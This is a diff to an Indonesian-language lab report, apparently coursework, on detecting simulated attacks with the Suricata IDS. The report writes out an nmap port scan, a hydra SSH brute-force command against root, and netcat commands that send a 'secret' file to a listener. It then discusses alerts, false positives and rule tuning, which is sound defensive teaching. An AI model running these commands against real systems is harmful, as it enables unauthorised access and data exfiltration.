@@ -44,7 +44,62 @@ alert http 10.20.30.10 any -> 10.20.10.0/24 any (msg:"[IDS] Suspicious Small HTT
 a. Simulasi SYN Scan
 Dari PC MAhasiswa
 
+b. Network Scanning (Nmap Scan)
+```
+nmap -sS -p- <IP_TARGET>
+```
+
+Suricata berhasil mendeteksi aktivitas scanning dan menghasilkan alert dengan kategori “SCAN”/“PORTSCAN”. Ini menandakan IDS mampu mengidentifikasi upaya pemindaian port yang umum digunakan untuk reconnaissance.
+
+c. SSH Brute Force
+```
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_TARGET>
+```
+
+Suricata berhasil mendeteksi aktivitas brute force terhadap layanan SSH dan menampilkan alert terkait upaya login berulang. Hal ini membuktikan IDS mampu mengidentifikasi perilaku autentikasi yang mencurigakan.
+
+d. Data Exfiltration (Transfer File Besar via Netcat)
+
+Receiver:
+```
+nc -lvp 4444 > file_terima.txt
+```
+
+Sender:
+```
+nc <IP_TARGET> 4444 < file_rahasia.txt
+```
+
+Suricata menampilkan alert terkait transfer data dalam jumlah besar, menunjukkan bahwa IDS mampu mengidentifikasi pola exfiltration sederhana melalui kanal TCP biasa.
 ### Analisis Singkat
+
+**Serangan Yang Paling Mudah Terdeteksi**
+
+Serangan yang paling mudah dideteksi oleh Suricata adalah network scanning (Nmap scan). Hal ini karena pola port scanning sangat khas dan memiliki signature yang jelas, seperti banyaknya koneksi SYN ke berbagai port dalam waktu singkat. Suricata memiliki rule bawaan yang secara spesifik ditujukan untuk mendeteksi scan, sehingga alert langsung muncul tanpa konfigurasi tambahan.
+
+**Adanya False Positive**
+
+Selama pengujian, potensi false positive muncul terutama pada serangan brute force. Ketika dilakukan koneksi SSH berulang kali, Suricata mendeteksinya sebagai brute force meskipun sebagian percobaan sebenarnya hanya berupa koneksi normal (misal gagal login karena salah ketik password). Selain itu, beberapa rule informasi (INFO alert) juga muncul meskipun tidak terkait serangan nyata. Hal ini wajar karena IDS berbasis signature dapat mendeteksi pola yang mirip serangan, walaupun dalam beberapa kasus aktivitas tersebut masih normal.
+
+**Hal yang perlu Ditingkatkan**
+Beberapa perbaikan yang dapat diterapkan:
+
+1. Penyesuaian Ruleset
+Menonaktifkan rule yang terlalu sensitif atau tidak relevan dengan lingkungan jaringan agar jumlah false positive berkurang.
+
+2. Menambahkan Custom Rules
+Custom rule yang lebih spesifik terhadap pola trafik di jaringan sendiri akan meningkatkan akurasi deteksi.
+
+3. Penerapan Thresholding dan Suppression
+Menambahkan threshold untuk event tertentu (misal SSH login) agar IDS tidak menganggap semua kegagalan login sebagai brute force.
+
+4. Integrasi dengan SIEM atau Alert Dashboard
+Agar analisis lebih mudah dan korelasi antar alert lebih jelas.
+
+5. Penyesuaian Performance (Tuning Suricata)
+Mengaktifkan multithreading dan memaksimalkan CPU cores supaya IDS tidak drop packet ketika trafik tinggi.
+
 
 ### Kesimpulan
 
+Berdasarkan pengujian yang dilakukan, Suricata berhasil mendeteksi seluruh jenis serangan yang disimulasikan, yaitu port scanning, brute force SSH, dan exfiltration traffic. Rule bawaan Suricata mampu mendeteksi scan dengan sangat cepat, sementara custom rules membantu memperjelas pola brute force dan transfer data mencurigakan. Meskipun terdapat beberapa potensi false positive, secara keseluruhan IDS berjalan efektif dan memberikan alert yang akurat. Dengan tuning rule dan threshold yang lebih baik, sistem dapat menjadi lebih presisi dan optimal untuk digunakan sebagai IDS dalam lingkungan jaringan.
